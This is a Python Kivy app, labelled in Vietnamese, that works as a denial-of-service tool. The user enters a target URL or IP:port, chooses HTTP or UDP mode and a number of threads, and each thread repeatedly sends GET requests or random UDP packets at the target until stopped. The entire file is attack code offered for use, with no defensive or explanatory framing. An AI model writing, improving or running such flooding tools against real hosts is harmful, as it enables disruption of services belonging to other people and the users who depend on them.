from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.spinner import Spinner
from kivy.uix.button import Button
from kivy.clock import Clock
from threading import Thread
import socket, requests, random, time

class DDoSLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', padding=10, spacing=10, **kwargs)

        self.running = False

        self.add_widget(Label(text="🌐 Nhập địa chỉ (URL hoặc IP:port):"))
        self.target_input = TextInput(multiline=False, hint_text="http://example.com hoặc 1.2.3.4:port")
        self.add_widget(self.target_input)

        self.add_widget(Label(text="📦 Chế độ tấn công:"))
        self.mode_spinner = Spinner(text='HTTP', values=['HTTP', 'UDP'])
        self.add_widget(self.mode_spinner)

        self.add_widget(Label(text="🧵 Số luồng:"))
        self.threads_input = TextInput(text='10', input_filter='int', multiline=False)
        self.add_widget(self.threads_input)

        self.log_label = Label(text="📋 Log sẽ hiển thị ở đây...", size_hint_y=None, height=100)
        self.add_widget(self.log_label)

        self.start_button = Button(text="🚀 BẮT ĐẦU", background_color=(0, 1, 0, 1))
        self.start_button.bind(on_press=self.start_attack)
        self.add_widget(self.start_button)

        self.stop_button = Button(text="🛑 DỪNG", background_color=(1, 0, 0, 1))
        self.stop_button.bind(on_press=self.stop_attack)
        self.add_widget(self.stop_button)

    def update_log(self, msg):
        self.log_label.text = f"[LOG] {msg}"

    def start_attack(self, instance):
        try:
            target = self.target_input.text.strip()
            mode = self.mode_spinner.text
            threads = int(self.threads_input.text)

            if not target:
                self.update_log("⚠️ Bạn chưa nhập mục tiêu!")
                return

            self.running = True
            self.update_log(f"🚀 Tấn công {mode} vào {target} với {threads} luồng")

            for _ in range(threads):
                Thread(target=self.attack_thread, args=(target, mode), daemon=True).start()

        except Exception as e:
            self.update_log(f"❌ Lỗi: {e}")

    def stop_attack(self, instance):
        self.running = False
        self.update_log("🛑 Đã dừng")

    def attack_thread(self, target, mode):
        while self.running:
            try:
                if mode == "HTTP":
                    requests.get(target)
                elif mode == "UDP":
                    ip, port = target.split(":")
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(random._urandom(1024), (ip, int(port)))
                Clock.schedule_once(lambda dt: self.update_log(f"📤 Gửi đến {target} OK"))
                time.sleep(0.3)
            except Exception as e:
                Clock.schedule_once(lambda dt: self.update_log(f"❌ Lỗi khi gửi: {e}"))
                break

class DDoSApp(App):
    def build(self):
        return DDoSLayout()

if __name__ == '__main__':
    DDoSApp().run()
